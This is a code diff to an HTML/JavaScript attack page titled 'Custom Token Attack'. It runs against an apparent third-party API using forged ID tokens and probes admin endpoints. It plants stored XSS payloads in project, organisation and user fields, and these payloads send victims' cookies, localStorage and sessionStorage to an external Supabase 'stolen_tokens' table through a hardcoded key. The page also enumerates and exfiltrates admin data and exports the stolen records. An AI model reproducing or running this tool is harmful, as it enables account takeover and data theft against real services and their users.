+                { path: 'accounts/users/current', method: 'GET', desc: 'Current user info' },
+                { path: 'organizations/members', method: 'GET', desc: 'Organization members' },
+                { path: 'organizations/roles', method: 'GET', desc: 'User roles' },
+                { path: 'organizations/audit', method: 'GET', desc: 'Audit log' },
+                { path: 'worlds', method: 'GET', desc: 'Worlds list' },
+                { path: 'sessions', method: 'GET', desc: 'Sessions' },
+                // Write endpoints
+                { path: 'organizations/projects', method: 'POST', desc: 'Create project (XSS vector)', body: { name: 'XSS_TEST', description: '<img src=x onerror="fetch(\'https://anruszfozkhgddzpcpft.supabase.co/rest/v1/stolen_tokens\',{method:\'POST\',headers:{\'apikey\':\'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImFucnVzemZvemtoZ2RkenBjcGZ0Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzc5MjE2NzcsImV4cCI6MjA5MzQ5NzY3N30.Ap3qNDAfJeKYS-3cUn3_A2c4rif3v13mx2Ex1uukp7c\',\'Content-Type\':\'application/json\'},body:JSON.stringify({attack_type:\'admin_xss\',cookies:document.cookie})})">' } },
+                { path: 'organizations/current', method: 'PATCH', desc: 'Update org (XSS vector)', body: { name: '<script>fetch("https://evil.com")<\/script>' } },
+                { path: 'accounts/users/current', method: 'PATCH', desc: 'Update user (XSS vector)', body: { displayName: '<img src=x onerror="alert(1)">' } },
+                { path: 'organizations/apiKeys', method: 'POST', desc: 'Create API key', body: { name: 'test_key' } },
+                // Admin-specific endpoints
+                { path: 'admin/users', method: 'GET', desc: 'Admin: All users' },
+                { path: 'admin/config', method: 'GET', desc: 'Admin: Config' },
+                { path: 'admin/analytics', method: 'GET', desc: 'Admin: Analytics' },
+                { path: 'admin/settings', method: 'GET', desc: 'Admin: Settings' },
+                { path: 'admin/billing', method: 'GET', desc: 'Admin: Billing' },
+            ];
+
+            const results = [];
+            for (let i = 0; i < adminEndpoints.length; i++) {
+                const ep = adminEndpoints[i];
+                try {
+                    const options = {
+                        method: ep.method,
+                        headers: {
+                            'Authorization': `Bearer ${token}`,
+                            'Content-Type': 'application/json'
+                        }
+                    };
+                    if (ep.body) options.body = JSON.stringify(ep.body);
+
+                    const resp = await fetch(`${API}/${ep.path}`, options);
+                    const status = resp.status;
+                    let data = null;
+                    try { data = await resp.json(); } catch(e) {}
+
+                    const isAccessible = status === 200;
+                    const isForbidden = status === 403;
+                    const isWrite = ['POST', 'PATCH', 'PUT', 'DELETE'].includes(ep.method);
+
+                    results.push({
+                        endpoint: ep.path,
+                        method: ep.method,
+                        status,
+                        accessible: isAccessible,
+                        isWrite,
+                        desc: ep.desc,
+                        data: data
+                    });
+
+                    endpointsTested++;
+
+                    if (isAccessible) {
+                        if (isWrite) {
+                            log('adminLog', `[CRITICAL] WRITE ACCESS: ${ep.method} ${ep.path} - ${ep.desc}`, 'critical');
+                            criticalFound++;
+                            vulnsFound++;
+                        } else {
+                            log('adminLog', `[ACCESS] ${ep.method} ${ep.path} - ${ep.desc}`, 'success');
+                            vulnsFound++;
+                        }
+
+                        // Save accessible data
+                        await saveToSupabase({
+                            attack_type: isForged ? 'admin_access_forged' : 'admin_access_original',
+                            firebase_api_key: TARGET_API_KEY,
+                            attack_vector: `${ep.method} ${ep.path}`,
+                            endpoint_tested: `${API}/${ep.path}`,
+                            response_status: status,
+                            admin_access_granted: isAccessible,
+                            admin_endpoints_accessible: JSON.stringify({ path: ep.path, method: ep.method }),
+                            admin_data_exfiltrated: JSON.stringify(data)?.substring(0, 5000),
+                            forged_id_token: isForged ? token : null,
+                            notes: `${ep.desc} - ${isAccessible ? 'ACCESSIBLE' : 'BLOCKED'}`
+                        });
+                    } else if (isForbidden) {
+                        log('adminLog', `[FORBIDDEN] ${ep.method} ${ep.path} - ${ep.desc}`, 'warning');
+                    } else {
+                        log('adminLog', `[${status}] ${ep.method} ${ep.path} - ${ep.desc}`, 'info');
+                    }
+                } catch(e) {
+                    log('adminLog', `[ERR] ${ep.method} ${ep.path}: ${e.message}`, 'error');
+                }
+
+                setProgress('adminProgress', 5 + ((i + 1) / adminEndpoints.length) * 95);
+            }
+
+            renderAdminEndpointMap(results);
+            updateStats();
+
+            log('adminLog', `\n=== Admin Access Test Complete ===`, 'success');
+            log('adminLog', `Accessible: ${results.filter(r => r.accessible).length}/${results.length}`, 'success');
+            log('adminLog', `Write Access: ${results.filter(r => r.accessible && r.isWrite).length} endpoints`, results.filter(r => r.accessible && r.isWrite).length > 0 ? 'critical' : 'success');
+        }
+
+        function renderAdminEndpointMap(results) {
+            const container = document.getElementById('adminEndpointMap');
+            container.innerHTML = results.map(r => {
+                const cls = r.accessible ? (r.isWrite ? 'ep-ok' : 'ep-warn') : 'ep-fail';
+                const statusCls = r.accessible ? (r.isWrite ? 's-ok' : 's-warn') : 's-fail';
+                return `<div class="ep-result ${cls}">
+                    <span class="ep-method">${r.method}</span> ${r.endpoint}<br>
+                    <span style="color:#888;">${r.desc}</span><br>
+                    Status: <span class="ep-status ${statusCls}">${r.status}</span>
+                    ${r.accessible && r.isWrite ? '<br><span style="color:#fca5a5;font-weight:bold;">WRITE ACCESS!</span>' : ''}
+                    ${r.accessible ? `<div class="ep-body">${JSON.stringify(r.data)?.substring(0, 150)}</div>` : ''}
+                </div>`;
+            }).join('');
+        }
+
+        async function attemptAdminXSS() {
+            const token = forgedIdToken || idToken;
+            if (!token) { log('adminLog', 'Not authenticated.', 'error'); return; }
+
+            log('adminLog', '=== Attempting Admin XSS Injection ===', 'info');
+
+            const xssPayloads = [
+                { name: 'img onerror', payload: `<img src=x onerror="fetch('${SUPABASE_URL}/rest/v1/stolen_tokens',{method:'POST',headers:{'apikey':'${SUPABASE_ANON_KEY}','Content-Type':'application/json'},body:JSON.stringify({attack_type:'admin_xss_stored',cookies:document.cookie,local_storage:JSON.stringify(localStorage),session_storage:JSON.stringify(sessionStorage)})})">` },
+                { name: 'script tag', payload: `<script>fetch('${SUPABASE_URL}/rest/v1/stolen_tokens',{method:'POST',headers:{'apikey':'${SUPABASE_ANON_KEY}','Content-Type':'application/json'},body:JSON.stringify({attack_type:'admin_xss_script',cookies:document.cookie})})<\/script>` },
+                { name: 'SVG onload', payload: `<svg onload="fetch('${SUPABASE_URL}/rest/v1/stolen_tokens',{method:'POST',headers:{'apikey':'${SUPABASE_ANON_KEY}','Content-Type':'application/json'},body:JSON.stringify({attack_type:'admin_xss_svg',cookies:document.cookie})})">` },
+            ];
+
+            const targets = [
+                { path: 'organizations/projects', method: 'POST', field: 'name' },
+                { path: 'organizations/projects', method: 'POST', field: 'description' },
+                { path: 'organizations/current', method: 'PATCH', field: 'name' },
+                { path: 'accounts/users/current', method: 'PATCH', field: 'displayName' },
+            ];
+
+            for (const payload of xssPayloads) {
+                for (const target of targets) {
+                    const body = { [target.field]: payload.payload };
+                    try {
+                        const resp = await fetch(`${API}/${target.path}`, {
+                            method: target.method,
+                            headers: {
+                                'Authorization': `Bearer ${token}`,
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify(body)
+                        });
+
+                        const status = resp.status;
+                        if (status === 200 || status === 201) {
+                            log('adminLog', `[INJECTED] ${payload.name} -> ${target.method} ${target.path}.${target.field}`, 'critical');
+                            criticalFound++;
+                            vulnsFound++;
+                        } else {
+                            log('adminLog', `[${status}] ${payload.name} -> ${target.method} ${target.path}.${target.field}`, status === 403 ? 'warning' : 'info');
+                        }
+                    } catch(e) {
+                        log('adminLog', `[ERR] ${payload.name}: ${e.message}`, 'error');
+                    }
+                }
+            }
+
+            updateStats();
+        }
+
+        async function enumerateAdminData() {
+            const token = forgedIdToken || idToken;
+            if (!token) { log('adminLog', 'Not authenticated.', 'error'); return; }
+
+            log('adminLog', '=== Enumerating Admin Data ===', 'info');
+
+            const dataEndpoints = [
+                'organizations/current',
+                'organizations/projects',
+                'organizations/apiKeys',
+                'organizations/members',
+                'accounts/users/current',
+            ];
+
+            let allData = {};
+            for (const ep of dataEndpoints) {
+                try {
+                    const resp = await fetch(`${API}/${ep}`, {
+                        headers: { 'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json' }
+                    });
+                    if (resp.ok) {
+                        const data = await resp.json();
+                        allData[ep] = data;
+                        log('adminLog', `[EXFIL] ${ep}: ${JSON.stringify(data).substring(0, 200)}...`, 'success');
+
+                        await saveToSupabase({
+                            attack_type: 'admin_data_enum',
+                            attack_vector: ep,
+                            endpoint_tested: `${API}/${ep}`,
+                            response_status: resp.status,
+                            admin_data_exfiltrated: JSON.stringify(data).substring(0, 5000),
+                            admin_access_granted: true,
+                            forged_id_token: token,
+                        });
+                    } else {
+                        log('adminLog', `[${resp.status}] ${ep}`, 'warning');
+                    }
+                } catch(e) {
+                    log('adminLog', `[ERR] ${ep}: ${e.message}`, 'error');
+                }
+            }
+
+            log('adminLog', `\nAdmin data enumeration complete.`, 'success');
+        }
+
+        async function testOriginalToken() {
+            if (!idToken) { log('adminLog', 'Not authenticated with original token.', 'error'); return; }
+
+            log('adminLog', '=== Testing Original Token Access ===', 'info');
+            forgedIdToken = null; // Reset to use original token
+
+            const endpoints = [
+                { path: 'organizations/current', desc: 'Org info' },
+                { path: 'organizations/projects', desc: 'Projects' },
+                { path: 'accounts/users/current', desc: 'User info' },
+            ];
+
+            for (const ep of endpoints) {
+                try {
+                    const resp = await fetch(`${API}/${ep.path}`, {
+                        headers: { 'Authorization': `Bearer ${idToken}`, 'Content-Type': 'application/json' }
+                    });
+                    let data = null;
+                    try { data = await resp.json(); } catch(e) {}
+
+                    log('adminLog', `[${resp.status}] ${ep.path} - ${ep.desc}`, resp.ok ? 'success' : 'warning');
+                    if (resp.ok) log('adminLog', `  Data: ${JSON.stringify(data).substring(0, 150)}`, 'data');
+                } catch(e) {
+                    log('adminLog', `[ERR] ${ep.path}: ${e.message}`, 'error');
                 }
             }
         }
 
-        async function tryAdminWithGuest() {
-            log('adminLog', '[ADMIN] This requires a Guest Token first. Go to Guest Token tab and create one.', 'warning');
-        }
-
         // =====================================================
-        // RESULTS
+        // TAB 6: RESULTS
         // =====================================================
         async function fetchResults() {
-            if (!db) { log('resultsLog', '[ERROR] Supabase not initialized', 'error'); return; }
-            try {
-                const { data, error } = await db.from('stolen_tokens').select('*').order('created_at', { ascending: false }).limit(50);
-                if (error) { log('resultsLog', `[ERROR] ${error.message}`, 'error'); return; }
-                if (!data?.length) { log('resultsLog', '[RESULTS] No data found.', 'warning'); return; }
+            const el = document.getElementById('resultsLog');
+            el.innerHTML = '';
 
-                log('resultsLog', `[RESULTS] Found ${data.length} records:`, 'success');
-                for (const row of data) {
-                    const type = row.attack_type || 'unknown';
-                    const email = row.victim_email || row.notes || '';
-                    log('resultsLog', `[${type}] ${email.substring(0, 60)}`, 'data');
+            log('resultsLog', 'Fetching data from Supabase...', 'info');
+
+            try {
+                const { data, error } = await db
+                    .from('stolen_tokens')
+                    .select('*')
+                    .order('created_at', { ascending: false })
+                    .limit(50);
+
+                if (error) {
+                    log('resultsLog', `Error: ${error.message}`, 'error');
+                    return;
                 }
-            } catch(e) { log('resultsLog', `[ERROR] ${e.message}`, 'error'); }
+
+                if (!data || data.length === 0) {
+                    log('resultsLog', 'No data found in Supabase.', 'warning');
+                    return;
+                }
+
+                log('resultsLog', `Found ${data.length} rows:\n`, 'success');
+
+                for (const row of data) {
+                    log('resultsLog', `--- Row ${row.id} ---`, 'info');
+                    log('resultsLog', `  Type: ${row.attack_type || 'N/A'}`, 'data');
+                    log('resultsLog', `  Created: ${row.created_at || 'N/A'}`, 'data');
+
+                    if (row.victim_email) log('resultsLog', `  Email: ${row.victim_email}`, 'data');
+                    if (row.firebase_api_key) log('resultsLog', `  Firebase API Key: ${row.firebase_api_key}`, 'data');
+                    if (row.attack_vector) log('resultsLog', `  Attack Vector: ${row.attack_vector}`, 'data');
+                    if (row.admin_access_granted) log('resultsLog', `  ADMIN ACCESS: ${row.admin_access_granted}`, 'critical');
+                    if (row.forged_id_token) log('resultsLog', `  Forged Token: ${row.forged_id_token?.substring(0, 40)}...`, 'data');
+                    if (row.service_account_email) log('resultsLog', `  SA Email: ${row.service_account_email}`, 'data');
+                    if (row.notes) log('resultsLog', `  Notes: ${row.notes}`, 'data');
+                    log('resultsLog', '', 'info');
+                }
+            } catch(e) {
+                log('resultsLog', `Exception: ${e.message}`, 'error');
+            }
         }
+
+        function exportResults() {
+            log('resultsLog', 'Exporting results...', 'info');
+            // Trigger a Supabase fetch and download as JSON
+            db.from('stolen_tokens').select('*').order('created_at', { ascending: false }).limit(100)
+                .then(({ data }) => {
+                    const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
+                    const url = URL.createObjectURL(blob);
+                    const a = document.createElement('a');
+                    a.href = url;
+                    a.download = `custom-token-attack-results-${Date.now()}.json`;
+                    a.click();
+                    URL.revokeObjectURL(url);
+                    log('resultsLog', `Exported ${data?.length || 0} rows.`, 'success');
+                })
+                .catch(e => log('resultsLog', `Export error: ${e.message}`, 'error'));
+        }
+
+        // =====================================================
+        // AUTO-INIT
+        // =====================================================
+        log('reconLog', 'Custom Token Attack page loaded.', 'info');
+        log('reconLog', `Target API Key: ${TARGET_API_KEY}`, 'data');
+        log('reconLog', 'Sign in with Google to begin testing.', 'info');
     </script>
 </body>
 </html>
